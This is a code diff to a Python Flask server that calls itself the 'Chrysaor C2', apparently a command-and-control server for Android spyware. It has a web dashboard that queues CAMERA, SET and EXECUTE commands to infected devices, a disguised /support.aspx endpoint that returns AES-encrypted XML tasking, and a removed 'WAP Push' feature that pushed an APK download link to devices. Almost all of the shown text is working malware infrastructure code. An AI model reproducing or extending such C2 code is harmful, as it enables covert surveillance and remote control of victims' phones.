@@ -1,6 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
 import base64
 import hashlib
 import re
@@ -9,8 +6,9 @@ import threading
 import time
 import gzip
 import os
+from xml.sax.saxutils import escape
 from datetime import datetime
-from flask import Flask, request, Response, render_template_string, jsonify, send_from_directory
+from flask import Flask, request, Response, render_template_string, jsonify, make_response
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad, pad
 
@@ -156,11 +154,9 @@ DASHBOARD_HTML = """
                 <option value="3">3 - SET</option>
                 <option value="4" selected>4 - CAMERA</option>
                 <option value="5">5 - EXECUTE</option>
-                <option value="10">10 - WAP PUSH</option>
             </select>
             <input id="cmdArgs" placeholder="Args (optional)">
             <button onclick="sendCommand()">Send</button>
-            <button onclick="sendWapPush()" class="wap">WAP Push</button>
             <span id="cmdResult" style="margin-left:10px;color:#7ec8e3;"></span>
         </div>
         <div class="log-area" id="logArea">
@@ -239,23 +235,6 @@ DASHBOARD_HTML = """
             }
         }
 
-        async function sendWapPush() {
-            const token = document.getElementById('cmdToken').value.trim();
-            if (!token) { alert('Token required'); return; }
-            const url = window.location.origin + '/samples/demo.apk';
-            try {
-                const resp = await fetch('/cmd', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({token: token, cmd: '10', args: url})
-                });
-                const text = await resp.text();
-                document.getElementById('cmdResult').textContent = ' ' + text;
-            } catch(e) {
-                document.getElementById('cmdResult').textContent = 'Error';
-            }
-        }
-
         setInterval(fetchDevices, 2000);
         setInterval(fetchLogs, 2000);
         fetchDevices();
@@ -313,12 +292,6 @@ def queue_command():
         return f"Command {cmd} queued for {token}", 200
     except Exception as e:
         return str(e), 500
-
-@app.route('/samples/<path:filename>')
-def serve_sample(filename):
-    if not os.path.exists('samples'):
-        os.makedirs('samples')
-    return send_from_directory('samples', filename)
 
 @app.route('/support.aspx', methods=['POST'])
 def support():
@@ -421,26 +394,25 @@ def support():
     with command_queue_lock:
         if token in command_queues and command_queues[token]:
             cmd = command_queues[token].pop(0)
+            safe_args = escape(cmd.get('args', ''))
             response_xml = f'''<?xml version="1.0"?>
-<response code="0" message="OK">
-    <cmd>{cmd.get('cmd', 1)}</cmd>
-    <a>{cmd.get('ack', 12345)}</a>
-    <arg>{cmd.get('args', '')}</arg>
-    <s>dummy_sig</s>
-</response>'''
+    <response code="0" message="OK">
+        <cmd>{cmd.get('cmd', 1)}</cmd>
+        <a>{cmd.get('ack', 12345)}</a>
+        <arg>{safe_args}</arg>
+        <s>dummy_sig</s>
+    </response>'''
             print(f"[+] Sending command {cmd.get('cmd')} to {token}")
         else:
             response_xml = '''<?xml version="1.0"?>
-<response code="0" message="OK"/>'''
+    <response code="0" message="OK"/>'''
 
     encrypted_response = aes_encrypt_response(response_xml.encode('utf-8'), token)
     print(f"[+] Encrypted response size: {len(encrypted_response)} bytes")
     return Response(encrypted_response, status=200, content_type='application/octet-stream')
 
 if __name__ == '__main__':
-    if not os.path.exists('samples'):
-        os.makedirs('samples')
-        print("[!] Created samples/ folder – place your demo.apk there.")
+    
     print("[+] Starting Chrysaor C2 with Web Dashboard")
     print(f"[+] Dashboard: http://{SERVER_HOST if SERVER_HOST != '0.0.0.0' else '127.0.0.1'}:{SERVER_PORT}/")
     app.run(host=SERVER_HOST, port=SERVER_PORT, debug=False, threaded=True)
